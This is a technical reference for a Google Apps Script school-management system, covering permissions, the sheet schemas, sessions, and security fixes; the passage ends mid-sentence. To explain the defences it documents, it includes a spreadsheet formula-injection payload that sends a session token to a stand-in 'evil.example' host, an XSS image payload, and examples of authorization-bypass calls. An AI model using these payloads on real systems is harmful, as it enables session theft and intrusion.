# 学生管理システム — Technical Reference

Architecture, data model, function reference and known quirks, written so that
any developer — including the original author returning after time away — can
understand and safely modify this system.

See `CLAUDE.md` for the workflow rules that must be followed when editing.

---

## 1. System Overview

A bilingual (JP/EN) school-management web app built entirely on Google Apps
Script, serving ~10–20 staff (admin, sales, teachers) on ordinary Gmail
accounts. In production, with a staging copy for testing — see §11.

### Modules

- **Interview scheduling** — teachers publish availability; sales book applicant
  interviews; reassignment, date-change and cancellation requests flow between
  them.
- **Interview results** — entry and editing with duplicate protection, intake
  tabs, and import from bookings.
- **Dormitory management** — buildings and rooms, tenant assignment, per-building
  and per-room billing, PDF room sheets, per-building document store.
- **Placement test dashboard** — configurable per-intake result views.
- **Student list, 学生数 report, simulation** — records from Central_DB plus
  nationality × course analysis.
- **募集状況 (Recruitment)** — prospective-student tracking by nationality ×
  recruiter × course, with capacity, non-student-visa and cancellation rosters.
  See §7.
- **User management & data safety** — PIN login, per-user permissions, snapshots,
  audit log, announcements.

### Navigation

A fixed left sidebar, not a top header. The nav buttons are the *original*
elements relocated into it with their ids, classes, `data-perm` and `onclick`
intact, so `switchMainTab`, the four sub-tab switchers and the permission loop
work unmodified — that is what kept the rewrite safe, and why those attributes
must be preserved if it is restructured again.

Collapsed it is a translucent 56px rail (logo + icons); the logo toggles it, and
clicking any icon expands it. State persists in `localStorage`. Sub-navs nest
under their section and are revealed **only** by
`body.sidebar-pinned .app-sidebar .sb-sub.open` — a bare `.sb-sub.open` rule
would sit later in the sheet at equal specificity and leak sub-tab labels into
the rail.

⚠️ `transition: 0.3s` with no property named means `transition: all`. `body`,
`.nav-btn` and `.sub-nav-btn` each had one, so the sidebar toggle animated
`padding` and relayouted the whole page every frame. They are now scoped to
colour. Watch for this shorthand before adding any animated layout property.

### Architecture

`doGet()` returns `Index.html` (the whole frontend). It calls `Code.js` via
`google.script.run`. All data is in Google Sheets; files are in Google Drive.
One deployment (`/exec`); after any backend change, Deploy → Manage deployments
→ edit → New version, and re-authorize if a new scope is touched.

---

## 2. Source Files

| File | Role |
|---|---|
| `Code.js` | Backend — ~170 functions, ~4,900 lines |
| `Index.html` | Entire frontend — ~508KB, ~8,900 lines. TWO `<script>` blocks; app code is the **second** |
| `Template.html` | Dorm room PDF template. Utility rows inject via `{{Utility_Rows}}` — adding a bill type needs no template change |
| `Shinsei_Code.js` / `Shinsei_Template.html` | Parked 申請関連 module, keyed by student name |

---

## 3. Roles & Permissions

Every user has a role plus a comma-separated permission string.

| Role | Behaviour |
|---|---|
| `master` | SYSTEM_PIN account, `permissions: "ALL"`. Bypasses every check, including permissions added later. Cannot be assigned to a user (guarded in `saveSystemUser`) |
| `admin` | Only the permissions ticked. Passes a few role-gated admin-only ops (snapshot restore, building cascade-delete) |
| `sales` / `teacher` | Only the permissions ticked |
| custom | Only the permissions ticked. Behaves exactly as `sales` — see below |

**Custom roles are permissions only.** The master defines them in 役割管理
(ユーザー管理 → master only), stored in the `Roles` sheet. `getRoles` needs
`manage_users`; `saveRole` / `deleteRole` need **master** — an admin manages
users, and if it could define roles it could mint one carrying `manage_users`
and hand it to itself.

⚠️ The role string is **not** just a permission bundle, which is why the
built-ins stay defined in `Code.js` (`BUILTIN_ROLES`) and cannot be edited or
deleted through the endpoints:

- `"teacher"` selects `Teacher_Master` over `Staff_Master` in five places, one of
  them inside `_resolveUserById_`, which runs on **every login**;
- `"teacher"` / `"sales"` decide which notification feed a user gets and how ホーム
  scopes their interviews;
- `"sales"` has its own branch in the booking-cancellation flow
  (`actorRole === "sales"`), deliberately **not** generalised — it encodes a
  specific 営業 workflow, not a permission;
- `"master"` is the SYSTEM_PIN account and `_isAdminRole_` treats it as admin.

A custom role lands in `Staff_Master` and inherits none of that. Guards:

- keys are `[a-z0-9_]` only — they are compared as raw strings in ~59 places, and
  a key with a space or a full-width character would match in some and not others
  (§9.1);
- a key may not be `master` or collide with a built-in, and a row hand-edited into
  the sheet claiming either is ignored by `_roles_()`;
- `deleteRole` **refuses while any user holds the role**, naming them. Deleting it
  out from under a user leaves an account whose role matches nothing, which fails
  closed at login — a lockout with no visible cause;
- `saveSystemUser` validates `u.role` against `_roles_()`. Before that it accepted
  any string but `master`, so a crafted call could store role `xyz`.

**Screens gated by role rather than permission.** Ten endpoints were guarded as
`_roleIsAnyOf_(userRole, ["sales"])` — "is the caller 営業", written before roles
could be created — so every custom role was refused however its permissions were
ticked. 学生数 and 部屋一覧 were the visible symptom: the sidebar gates on
`view_students` / `view_dorms`, so the tab appeared and only the data behind it
threw 権限がありません. They now go through `_permOrLegacyRole_(role, perms,
needed, legacyRoles)`, which ORs the permission with the old role list so the
built-ins behave exactly as before:

| Endpoint | Permission |
|---|---|
| `getDashboardData`, `getLiveReportData`, `fetchAndMergeStudentData` | `view_students` |
| `getDormData`, `getBuildingList` | `view_dorms` |
| `exportSpecificPDF`, `getBuildingRoomsForExport`, `buildRoomHtmlBatch`, `combineRoomHtmlToPdf` | `export_dorms` |
| `getUploadedFile` | `view_dorms` **or** `view_interview_results` |

⚠️ `perms` is the **last** parameter at all twelve call sites, deliberately: an
appended argument a caller forgets arrives as `undefined` and falls back to the
role list, so built-ins keep working and a custom role fails closed. Inserting it
second would have shifted `includePast` into the `perms` slot at any missed site.

⚠️ Keeping the role list as an OR means a 営業 without `view_dorms` still reaches
`getDormData`. That is pre-existing looseness, not something introduced with
roles; tightening it would lock out whoever relies on it today.

`_roleIsAnyOf_` now has exactly one caller, `_permOrLegacyRole_`. A second caller is
almost certainly a permission check written as a role check.

Two further role lists were generalised the same way: `wantsNotif` in
`_bootPayload_`, and the gate in `getUpcomingForUser`. Both are behaviour-preserving for the built-ins (営業 holds
`view_admissions`). In `getUpcomingForUser` admin/master are excluded **first** —
`_hasPerm_` returns `true` for master unconditionally, so the order is the control.

**`Staff_Master` column 12 (`Role`).** The sheet never stored a role: every row
was `sales`, hardcoded in `getSystemUsers` and derived from the sheet name
everywhere else — which is why `admin` worked throughout `Code.js` but no account
could hold it. The column is added on demand (`_ensureRoleColumn_`, same reasoning
as `_ensureAccountColumns_` in §6.1) and sits **after** the password block so
columns 1–11 are untouched. `Teacher_Master` deliberately does not use it.

`_staffRoleFromRow_` treats the cell as untrusted input: blank, unknown, `master`
and `teacher` all fall back to `sales`. Failing to `sales` rather than to nothing
matters — an account resolving to no role logs in to an empty app with no error.
⚠️ `_usersWithRole_` reads the **raw** cell instead, because folding an unknown
role to `sales` there would report nobody holding the role being deleted.

Staff↔staff role changes are a cell write and are allowed in the edit form.
Staff↔教務 is a sheet move and is not offered.

**The master PIN lives in the `SYSTEM_PIN` script property, not in `Code.js`.**
`Code.js` is tracked in git, so anything written there is in the history
permanently. `_systemPin_()` reads the property and **returns `""` when it is
unset, which disables the master account**: `loginUser` refuses the MASTER path
with 「マスターアカウントは未設定です」 and `_resolveUserById_` returns `null`, so
`resumeSession` also revokes any live master session.

This is deliberate and replaced an earlier `SYSTEM_PIN_FALLBACK` constant. The
fallback failed **open, and silently** — script properties are not carried by
File → Make a copy, and a staging project has its own set, so any copy of this
code ran with a known hard-coded password for the one role that bypasses every
permission check. It also bought nothing: the property is set from ⚙ Project
Settings, which needs editor access, not a login. **Any new project — staging
included — must have `SYSTEM_PIN` set before master works there.**

- Set it **by hand**: ⚙ Project Settings → Script Properties, key `SYSTEM_PIN`.
  There is deliberately no `setSystemPin` function — see §7.5.
- Check it without revealing it: `checkSystemPin()` (needs the maintenance
  unlock). It applies `SYSTEM_PIN_MIN_LENGTH` (8) and **flags a value matching
  an existing staff/teacher PIN** — master is tested first, so a collision
  would silently grant that person master access with nothing looking wrong
  from their side.

⚠️ Prefer alphanumeric. At the 8s failure-delay cap, 8 digits is ~309 days of
online guessing; 8 alphanumeric characters is ~1.8 million years. Length alone
is not the lever — `tests/login.test.js` §5 has the arithmetic.

### Permission values

| Permission | Grants |
|---|---|
| `view_students` / `export_students` | Student list view / export |
| `view_simulation` / `edit_simulation` | Simulation view / edit |
| `view_recruitment` | 募集状況 read-only |
| `edit_recruitment` | 募集状況 numbers, countries, 留学ビザ以外, キャンセル |
| `edit_enrollment` | 年度別月間在籍者数 の手動入力。Moved off `_isAdminLevel_` so the master can grant it per user; `_hasPerm_` still passes master unconditionally |
| `manage_recruitment` | 募集状況 intakes, 定員, 地域, 担当者, 連絡事項, 日程 (implies the two above) |
| `view_dorms` / `edit_dorms` / `export_dorms` | Dorm view / edit (incl. room deletion) / export |
| `view_admissions` / `edit_admissions` / `export_admissions` | Interview schedule levels |
| `view_interview_results` / `entry_interview_results` | Results view / entry, edit, delete, import |
| `view_placement` / `manage_placement` | Placement dashboard / its config |
| `view_teacher_schedule` | Identifies a teacher's own column; default for new teachers |
| `manage_users` | User administration |

**Enforce on both sides.** Hiding a button is not access control — every backend
function checks. Equally, the UI must not be *stricter* than the backend, or
admins see controls hidden for actions the server would accept.

---

## 4. Data Model

Column indices are 0-based as read in code. Row 1 is headers; data starts row 2.

### 4.1 Schedule_DB — interview bookings

| Idx | Field | Idx | Field |
|---|---|---|---|
| 0 | Timestamp | 12–15 | Reassign_* (id, name, date, period) |
| 1 | TeacherID | 16–20 | BookerReq_* (date, period, reason, status, by) |
| 2 | Name (teacher = 面接者) | 21 | Reassign_Reason |
| 3 | Date | 22 | Cancel_Reason |
| 4 | Period | 23 | 学期 (intake) |
| 5 | Status | 24 | 備考 (remarks) |
| 6 | Student | | |
| 7 | Nationality | | |
| 8 | MeetingLink | | |
| 9 | DocURL (hearing sheet) | | |
| 10 | Course | | |
| 11 | InCharge (担当) | | |

### 4.2 Room_Info — dorm rooms

| Idx | Field | Idx | Field |
|---|---|---|---|
| 0 | Timestamp | 11 | nationality |
| 1 | building (= building ID) | 12 | class |
| 2 | roomNumber | 13 | roomCode |
| 3 | rent (blank ⇒ inherit building) | 14 | remarks |
| 4 | mailbox | 15–19 | bill overrides (water, elec, gas, internet, other) |
| 5 | delivery | 20 | hot water override (給湯代) |
| 6 | wifi | | |
| 7 | status (空室 = vacant) | | |
| 8 | bicycle | | |
| 9 | studentId | | |
| 10 | studentName | | |

Multi-tenant rooms are ONE row with names joined by newline. Bill overrides are
bilingual `"EN\nJP"` and **replace** the building value when set.

### 4.3 Building_Info

| Idx | Field |
|---|---|
| 0 | id (referenced by rooms) |
| 1 / 2 | nameEn / nameJp |
| 3 / 4 | addressEn / addressJp |
| 5–12 | garbage / route / misc (bilingual) |
| 13–16 | water / elec / gas / internet default bills |
| 32 / 33 | exterior photo Drive ID / caption |
| 40–42 | bicycle captions |
| 43 | other bill |
| 44 | docIds (comma-separated Drive IDs of 別紙) |
| 45 | hot water bill (給湯代) |
| 46 | rent default (家賃) |
| 47 / 48 | 燃えるゴミ(プラスチックを含む) collection day / bag |

**`BUILDING_COLS` (currently 49) is the single definition of this sheet's
width.** `updateBuilding` uses it for *both* the read width and the padding
loop, so those two can no longer drift apart — a mismatch writes the row back
short and truncates the tail, silently destroying `docIds` and every 別紙
attached to the building. When adding a column, raise `BUILDING_COLS` and add it
to `tests/buildingcolumns.test.js`, which asserts the constant is exactly one
past the highest index used.

⚠️ `updateBuilding` finishes with
`getRange(row, 1, 1, existingRow.length).setValues(...)`, so a row wider than
the sheet's grid makes **every building save throw**. `_ensureBuildingColumns_`
is called at the top of both `saveBuilding` and `updateBuilding` to widen the
grid on demand — which is why adding a column needs no migration-before-deploy
ordering. `migrateBuildingAddBurnablePlastic` only labels the headers, and
Building_Info's header row is never read by code.

⚠️ Column 44 (`docIds`) is owned by the 別紙 upload/remove handlers and must
**never** be assigned from `formObject` in `updateBuilding` — doing so wipes
every attachment the next time somebody edits the building's address.

### 4.4 Other sheets

| Sheet | Purpose / key columns |
|---|---|
| `Staff_Master` / `Teacher_Master` | 0 id, 1 name, 2 PIN, 3 email, 4 notif (OFF=off), 5 permissions, 6–10 password block, **11 Role (Staff_Master only)** |
| `Roles` | キー, 表示名, 既定の権限, 更新者, 更新日時. **Custom roles only** — built-ins live in `BUILTIN_ROLES` in `Code.js` |
| `Interview_Results` | Timestamp, 日付, 入学期, 課程, 国籍, 名前, 性別, 年齢, 学歴, 現在のレベル, 点数, プレースメントテスト点数, 合否, 面接者, 担当, 申請, 2回目面接, 3回目面接, 備考, EnteredBy |
| `PlacementTest_Config` | 1-based: Intake Name, Course, Results URL, Tab, Entry Link, Sort Order, Columns(JSON) |
| `Central_DB` / `Past_DB` | Students. **学籍番号 encodes the intake: first 4 digits = year, next 2 = month.** コース may carry a prefix before `_` |
| `Dorm_Aliases` | Student-written dorm name → building ID |
| `Sessions` | token → role, id, name, LastSeen |
| `Activity_Log` | Timestamp, User, ID, Role, Action, Target, Details |
| `Announcements` | ID, 作成日時, 作成者, 対象, 本文, 有効期限, 既読者 |

---

## 5. Constants

| Constant | Meaning |
|---|---|
| `SYSTEM_PIN_PROP` | `SYSTEM_PIN` — the script-property key. There is no in-file fallback value, on purpose; see §on roles below |
| `SYSTEM_PIN_MIN_LENGTH` | 8 — enforced by `checkSystemPin`'s report |
| `MAINT_UNLOCK_PROP` | `MAINTENANCE_UNLOCK` — script property gating the maintenance functions; value must be today's date (Asia/Tokyo) |
| `AUTO_SYNC_MIN_GAP_SEC` | 600 — throttle on `triggerAutoSyncStudents`, which cannot be locked |
| `PW_ITERATIONS` | 100,000 — SHA-256 chain length for new passwords. Stored per row, so changing it never invalidates existing ones |
| `PW_MIN_LENGTH` | 8 — enforced by `_passwordProblem_` |
| `PW_ALGO_TAG` | `s1`. Hashes are stored `s1$<base64>`; verification fails closed on any other tag |
| `ACCOUNT_COLS` | 11 — width of `Staff_Master` / `Teacher_Master` after `migrateAddPasswordColumns` |
| `PHOTO_FOLDER_ID` | Drive folder for building photos |
| `UPLOADS_FOLDER_ID` | Hearing sheets + building documents. Formerly `PDF_FOLDER_ID` — **generated PDFs are NOT stored here** |
| `BUILDING_DOCS_FOLDER_ID` | Alias of `UPLOADS_FOLDER_ID` |
| `MAX_BUILDING_DOCS` | 7 documents per building |
| `SNAPSHOT_KEEP` | Snapshots retained per sheet |
| `SNAPSHOT_THROTTLE_SEC` | 600s — minimum gap between `_snapshotSheetThrottled` copies of the same sheet. Raise it to make saves cheaper still and stretch retained history; see §8.3 |
| `SESSION_TOUCH_WINDOW` | 21600s — how often `resumeSession` bothers to rewrite `LastSeen`. **Also the granularity of the sliding expiry below**, so the two are related now |
| `SESSION_MAX_AGE_DAYS` | 30 — idle days before a token stops resuming. Sliding, measured against `LastSeen`. Must stay far above `SESSION_TOUCH_WINDOW`: that throttle is why the true expiry is anywhere in [30d, 30d + 6h], and closing the gap would sign out people who are actively working |
| `CACHE_TTL_SHORT` / `CACHE_TTL_LONG` | 300s / 1800s — see §8 |

PDFs are generated as base64 and downloaded to the device; nothing is written to
Drive.

### Stored files are served through the app, never linked

Hearing sheets **and** building 別紙 open via `getUploadedFile` → the client's
`openStoredFile(idOrUrl, btn)`. Drive holds them privately; the app reads them
as the deploying user and returns base64.

A raw `<a href>` to a Drive URL only works while the file is *shared*, which
means readable by anyone holding the link, with no login. That is what this
replaces — hearing sheets at `@214`, 別紙 later.

⚠️ **The membership check in `getUploadedFile` is the point of the function.**
It reads as the deployer, so without it any caller could pass the id of the
bound spreadsheet, a SMS_Backups_… snapshot, or anything in the photo folder. A
well-formed id is not enough: it must appear in one of **three** allow-lists —
`_hearingSheetFileIds_()` (Schedule_DB idx 9), `_buildingDocFileIds_()`
(Building_Info idx 44), or `_generalDocFileIds_()` (General_Docs row 2 col 1, the
共通別紙 that belong to no building). They are checked in that order, cheapest
common case first.

⚠️ **A document store the check does not know about is unreachable.** The file
uploads, lists and renames perfectly, and every attempt to open it is refused —
which is exactly how 共通別紙 shipped broken at staging `@106`. Adding a fourth
store means adding a fourth term to that condition **and** re-reading
`tests/uploadedfile.test.js` §5 and §6: they re-run the rejection cases against
the widened list, because widening an allow-list is precisely when to re-prove
it still rejects.

⚠️ **The membership check is deliberately not per-caller — decided 2026-08-21.**
It proves a file belongs to *a* record, not to *this caller's* record, so any
営業/教師 can open any student's hearing sheet by id. Reviewed and **left as it
is**: a caller still needs a valid session and a real Drive id, which makes it an
internal-trust question rather than an exposure, and several people legitimately
open colleagues' sheets. This is a choice, not an oversight — do not "fix" it
without asking, because tightening it removes access somebody uses daily. If it
ever needs to change, the two shapes considered were: owner-only (the booking's
teacher by id, its 担当 by name, plus admin-level), or that plus a grantable
"see all" permission for 教務 and cover staff.

⚠️ Making the folder private does **not** retroactively unshare files created
earlier with ANYONE_WITH_LINK. `_unshareHearingSheets` is the precedent for a
one-off sweep.

---

### 4.5 `Enrollment_History` — the 年度別月間在籍者数 series

⚠️ **Why this sheet has to exist.** `Central_DB` is a snapshot of who is enrolled
*now*. A student who leaves is a row that **vanishes** — no departure date exists
anywhere: `卒業予定` is blank on 1381/1400 rows and `Past_DB`'s tabs are coarse
cohorts (`修了2024.4~2025.3`), not months. Month-on-month decrease **cannot be
reconstructed after the fact**; it can only be measured as it happens.

| 年月 | 区分 | 値 | 人数 | 記録日時 | 入力種別 |
|---|---|---|---|---|---|
| 2026-08 | 合計 | | 608 | … | 自動 |
| 2026-08 | 国籍 | ネパール | 64 | … | 自動 |
| 2023-04 | 合計 | | 502 | … | 手動 |

`区分` ∈ 合計 / 国籍 / コース / 性別 / 入学期 / 入 / 復帰. ⚠️ **A blank `入力種別` means
`自動`** — every row written before that column existed was measured, and reading
blank as 手動 would relabel the app's own history and freeze it against refresh.

**`_recordEnrollmentSnapshot_` runs on every daily trigger and REPLACES the current
month.** It used to write once, on the first run of a new month — a start-of-month
figure, while the report is 毎月月末締; in April that is a 116-student difference.
⚠️ It refuses to touch a month containing a `手動` row: a nightly job that
overwrote typed figures would destroy the history the feature exists to hold.

**年度 is April–March**, matching the sync source's own tabs. `2026-03` belongs to
2025年度. `_stuFiscalYear` / `_stuYm` are exact inverses; getting one wrong shifts a
whole column by a year.

**出 and 前月差 are derived, never stored:**

```
前月差(M) = 在籍(M) − 在籍(M-1)
出(M)     = 在籍(M-1) + 入(M) − 在籍(M)
```

This reproduces the reference report exactly (4月: 647 + 173 − 531 = 289). ⚠️ Three
things it cannot see, all surfaced rather than hidden: a student who joins **and**
leaves inside one month cancels out; a month whose predecessor is missing reports
`—`, not 0; and 月平均 divides by the months that have a figure, since dividing by
12 would report a part-finished year as a collapse.

**Editing** — `saveEnrollmentMonths` is guarded by the `edit_enrollment`
**permission**, not by admin level: it began as `_isAdminLevel_` on the reasoning
that rewriting a reported figure is an admin act, but that made it ungrantable and
the master needed it delegable. It validates every month before deleting anything,
so a bad payload cannot half-apply, and marks what it writes `手動`. ⚠️
`getEnrollmentHistory`'s `canEdit` must stay the **same expression** — the two
decide whether the button appears and whether pressing it works.

---

### 4.6 `Enrollment_Roster` — the ID set behind each month's 合計

⚠️ **Why counts alone were not enough.** §4.5 stores two scalars a month, so "the
number went up" and "these people arrived" are the same fact to it. They are not. A
row deleted from the source 在籍 tab by accident and re-entered days later is
indistinguishable from a departure followed by an arrival — and because
`_recordEnrollmentSnapshot_` only ever rewrites the **current** month, a month end
falling in between freezes the deficit forever and the restore surfaces as next
month's phantom increase. That is how it was reported: *"an increase in student but
there is no new student factually."*

| 年月 | 連番 | 学籍番号（カンマ区切り） | 人数 | 記録日時 |
|---|---|---|---|---|
| 2026-08 | 1 | 260401,260402,… | 200 | … |
| 2026-08 | 2 | 260601,260602,… | 200 | … |

Chunked at `ENROL_ROSTER_CHUNK` (200) so a cell stays readable; retained for
`ENROL_ROSTER_KEEP_MONTHS` (26), pruned in the same bottom-up pass that replaces
the month. ⚠️ **Its own sheet, not more rows in `Enrollment_History`** —
`getEnrollmentHistory` reads that sheet whole on every 増減推移 open, and ~5KB of
ids a month would ride along on an interactive path that never looks at them.

⚠️ `_enrolStudentIds_`'s "is this row a student" test must stay identical to
`_enrolBucketsFor_`'s (a non-blank 学籍番号, nothing else) or `|roster|` and `合計`
count different populations. Two divergences exist and both lean safe: a duplicated
id counts twice in `合計` and once in the roster (impossible via the sync, which
keys records by id), and a **renamed 学籍番号 header** empties the roster while
`合計` counts on — which is what makes the next run *hold* rather than record a
school of zero.

**The gate.** Before rewriting the month, `_recordEnrollmentSnapshot_` compares
today's ID set against the stored roster and **holds — writing neither the counts
nor the roster — when too many known students have vanished with nothing to account
for them.** Same shape as the dorm-vacate gate (§6.5), and the same reason: it runs
unattended.

⚠️ **A graduation is not a deletion, and `Past_DB` is what says so.** A student who
genuinely leaves is *moved* to a 修了 tab, which the sync mirrors into `Past_DB`; a
row deleted by mistake is gone from both sheets. So only the **unaccounted**
disappearances count against the cap (`_enrolPastIds_`). Without that filter, 50
graduates moved out mid-month were indistinguishable from 50 deleted rows and the
month was refused outright — freezing it 50 too high, the opposite error to the one
the gate exists to prevent. The filter also makes the gate *stricter*: legitimate
departures no longer consume the budget that a simultaneous accident could hide
behind.

⚠️ `_enrolPastIds_` returns **`null`**, never `{}`, when `Past_DB` cannot be read or
its 学籍番号 header has been renamed, and the caller then counts every departure —
losing the accounting must narrow the gate, never widen it. In the arithmetic
`null` and `{}` behave identically (an empty object filters nothing out); the
distinction is load-bearing in exactly one place, the 修了データ読取不可 marker on the
held log entry, because *"38 of 40 graduated"* and *"we could not check"* need
different responses. ⚠️ It is read **only when somebody actually went missing** —
`Past_DB` is ~1400 rows and the common night is one where nobody left.

⚠️ **Two ratios, because the two comparisons mean different things.** Against this
month's own roster the drop is intra-month and has no innocent explanation, so
`ENROL_DROP_MAX_RATIO` is 0.05. Against last month's, a real cohort leaves — the
worst on record is April's 116 of 647, or **18%** — so `ENROL_MONTH_DROP_MAX_RATIO`
is 0.35. Swapping them would refuse to record every April. `ENROL_DROP_MIN` (10) is
the floor, for the same reason `DORM_VACATE_MIN` has one.

⚠️ **Fails open with no baseline**, so the first run after deploy still records; it
arms itself that night. A held month leaves a roster gap, and the gate fails open
across a gap rather than compounding — the escape hatch is the 手動 editor, which
marks the month and makes the snapshot skip it entirely.

**`_recordEnrollmentReturns_` is the other half, not a nicety.**

```
復帰(M) = roster(M) ∩ roster(M-2) \ roster(M-1)
```

⚠️ The gate cannot catch a deletion made on the **1st** of a month: the baseline is
then last month's roster, the loose arm lets it through, and every later night
compares against the already-bad roster. This finds that one, a month later. It
writes a `復帰` row **onto the accused month M-1** (`値` = the month they came back
in) and stops there — ⚠️ **it never rewrites `合計`**, because a nightly job that
edits a reported figure is worse than the bug it would be fixing. `ENROL_RETURN_MIN`
is 2: one returner is an ordinary leave of absence.

It skips a month already marked `手動`, and `saveEnrollmentMonths` drops the `復帰`
row for any month it rewrites — so correcting the figure is what clears the
accusation, from both ends.

⚠️ **Both paths reach `Activity_Log`** (在籍者数の更新を保留 /
在籍者数の記録漏れの可能性を検出), because nobody reads the execution log of a job
that runs at 3am. The held entry carries both halves — 不在 N名（うち修了記録なし M名）
— since the two numbers call for different responses. The **clean** run's
departed/accounted split goes to `console.info` only: it is tuning data for
`ENROL_DROP_MIN` and the ratios, and a nightly audit row on every healthy run is how
an audit trail stops being read. There is **no UI for either yet** — 増減推移 is unchanged, and
`getEnrollmentHistory` returns `returned` per month for whenever there is.

---

## 6. How Key Features Work

### 6.1 Login and sessions

`loginUser(email, password)` matches on **email**, trimmed and case-insensitive,
across both master sheets, then issues a token stored in `Sessions`.
`resumeSession(token)` re-resolves the user on reload, so permission changes take
effect without re-login. Legacy sessions that recorded master as `admin` are
still accepted. Master signs in as **`MASTER`** with the `SYSTEM_PIN` script
property — it lives in no sheet, which is what makes it the break-glass.

Passwords are salted and hashed. Columns 7-11 (idx 6-10) of each master sheet:
`PasswordHash`, `Salt`, `PwIterations`, `PwUpdatedAt`, `PwMustChange`.

⚠️ **SHA-256 is implemented by hand in `Code.js`.** Not a preference —
`Utilities.computeHmacSha256Signature` costs ~1.25 ms *per call* in Apps Script,
so 10,000 iterations took **9 seconds** and a ~300 ms budget bought only ~250
iterations. In-process the same budget buys ~100,000. `tests/password.test.js` §0
checks it against the NIST vectors and against Node's `crypto` for every input
length 0-130 bytes — that range is deliberate, since it spans the 55/56/64-byte
padding boundaries where such implementations fail. **If you touch
`_sha256Bytes_`, that section must stay green.**

⚠️ **Hashes carry an algorithm tag** (`s1$…`) and verification **fails closed**
on anything else. Bump `PW_ALGO_TAG` when changing the algorithm; every existing
password then stops verifying and must be reset, which is the safe direction.

**The legacy-PIN path is self-completing.** While a user's hash is empty their
old plaintext PIN works *once* and forces a password set; the moment a hash
exists that branch no longer applies to them. `_writeAccountPassword_` also blanks
column 2, so plaintext PINs disappear per user as people migrate.
`auditAccountReadiness()` reports who is left.

⚠️ **Credential functions identify the caller from the session token**, never
from a client argument — `changeOwnPassword`, `completePasswordSetup`,
`adminResetPassword` all go through `resumeSession`.

**Every other endpoint is now session-authoritative too**, since `AUTH_ENFORCE=1`
on 2026-08-05. The role and permission arguments are still in ~60 signatures, but
`_effectiveRole_` / `_effectivePerms_` discard them and read the parked session
instead. A direct `google.script.run.getDashboardData("teacher")` — which used to
return 608 student records — now resolves no session and is refused.

> This paragraph used to say the opposite: that the app trusted the client in ~60
> places and that closing it was "the natural next piece of work". It had been
> stale since the flip, and on 2026-08-19 it sent a reviewer looking at finished
> work while twelve genuinely open holes sat elsewhere in this file. §11's warning
> that a stale reference is worse than none is not theoretical.

⚠️ **The guard helpers are the only route to the session, so a condition that
reads a permission itself is not a guard.** Twelve endpoints were written as

```js
if (!_isMasterRole_(userRole) && !(userPerms && String(userPerms).split(",").indexOf("edit_dorms") !== -1))
```

— session-aware on the left, client-supplied on the right, `&&`-ed so the weaker
half decided alone. `google.script.run.saveBuilding({permissions:"edit_dorms"})`
wrote `Building_Info` with no session; `getSystemUsers("", "manage_users")`
returned every staff name, email and password state to an anonymous caller.
`saveSystemUser` and `deleteSystemUser` were the same. Fixed 2026-08-19 by routing
all twelve through `_hasPerm_`.

`tests/endpoints.test.js` §3.1 now fails on the shape. Note **why it did not
before**: its `GUARDS` list contained the literal string `'権限がありません'`, so a
function counted as guarded for containing the error message — the suite was
reporting "0 still trusting the client" the entire time. Never put anything on
that list that is not the name of a function which consults the session.

**Sessions expire after 30 idle days** (`SESSION_MAX_AGE_DAYS`), sliding on
`LastSeen`. `resumeSession` checks it **before** resolving the user and before
parking `_authUser` — parking an expired session would make it live for every
guard in the file — deletes the row, and throws the same
「セッションが無効です」 as an unknown token, which the client already handles.
`_pruneExpiredSessions` sweeps the sheet on each login, so `Sessions` stays
bounded without a trigger.

⚠️ The expiry check **fails open** on a `LastSeen` it cannot parse, and treats a
blank one as current. `_readTabs_` renders with `FORMATTED_STRING`, so the value
is whatever the spreadsheet's locale prints — and failing closed on an
unanticipated format would sign out every member of staff at once with nothing on
screen saying why. Unreadable values go to Cloud Logging instead.

### 6.1.0 Sheet writes: formula injection

⚠️ **A cell whose text starts with `=` or `+` is a FORMULA, not a label.**
`setValue("=…")` from Apps Script creates a live one. So a 備考 or a building name
of `=IMPORTXML("https://evil.example/?d="&Sessions!A2,"//a")` runs the next time
anyone opens the workbook — reading the **hidden `Sessions` sheet in this same
spreadsheet** and posting a valid token out. Nothing looks wrong inside the app,
because every read goes through `getDisplayValues()`, which returns the formula's
*result*.

`_cellSafe_(v)` prefixes such a value with an apostrophe — Sheets' own "treat as
text" marker, which is not part of the stored value, so `_normName_` and every
other lookup are unaffected. Non-strings pass through, so Dates stay Dates and
counts stay numbers (§9.3).

**Wrap the array, never the fields.** Write sites use
`setValues([_cellSafeRow_([...])])` around the existing array: positional
read/write maps are the worst silent-corruption class here (§8.3), and `map()`
cannot change order or length. `_logActivity_` is the highest-value site — 51 call
sites feed it and `Activity_Log` is read by a human.

⚠️ **Sheets and Excel need different character sets.** `_cellSafe_` guards `=` and
`+` only; `-` is just a negative number to Sheets and `@` is not special. The CSV
export (`_expCsv`) guards `= + - @`, because **Excel** is looser — but exempts
plain numbers so an ordinary `-5` still exports as a number. `tests/cellsafe.test.js`
covers both.

### 6.1.1 Output escaping (`Index.html`)

The frontend builds ~116 HTML fragments by interpolation and assigns them to
`innerHTML`. Four helpers, and picking the wrong one is the usual mistake:

| Helper | Use for |
|---|---|
| `escHtmlJs` | text content. Escapes `& < >` |
| `escAttrJs` | a value inside a **double-quoted** attribute. Adds `"` |
| `escAttrJsStr` | a value inside a **JS string literal inside an attribute** — the `onclick="f('${id}')"` shape. Adds `\` and `'` |
| `_safeHref` | a URL going into an `href`. Escaping is not enough there: `javascript:` executes on click with no tag injection at all |

⚠️ **Apps Script does not sanitise this page.** It is served as-is inside the
iframe, so an injected `<img src=x onerror=…>` runs in the victim's document,
where `currentUser`, `apiRun()` and the session token in `localStorage` all live.
No network egress is needed — calling `apiRun()` as the victim *is* the attack. A
holder of an ordinary permission like `edit_dorms` could name a building
`<img src=x onerror="…">` and have it run in the master's browser.

About 30 sinks carried sheet data raw until 2026-08-19 — 学生一覧 → 在籍学生 and
the 詳細 modal its rows open, the 学生数 report, the **ユーザー管理** user table,
the building header in 部屋一覧, the interview calendar, and the シミュレーション
grid. `tests/xss.test.js` scans both the template-literal and the
string-concatenation form and fails on any interpolation that is neither escaped
nor on its reviewed `SAFE` list. **When it fails, the fix is almost always to
wrap the expression, not to extend `SAFE`.**

⚠️ Two pairs of names are easy to swap, and both were swapped in the handover
notes for this change. **学生数** is the `report` sub-tab of 学生一覧, rendered
server-side into `reportTable`, with no row click and no 詳細 modal; the modal
belongs to its sibling **在籍学生** (`currentStudentTable`). And **ユーザー管理**
is its own top-level tab (`view-users`), not part of **アカウント設定**
(`renderAccountTab`, which shows the signed-in user their own profile).

⚠️ There are **three different `const esc`** in `Index.html`. 3631 and 8950
escape HTML; **8890 does CSV quoting** — it doubles the double-quote and leaves
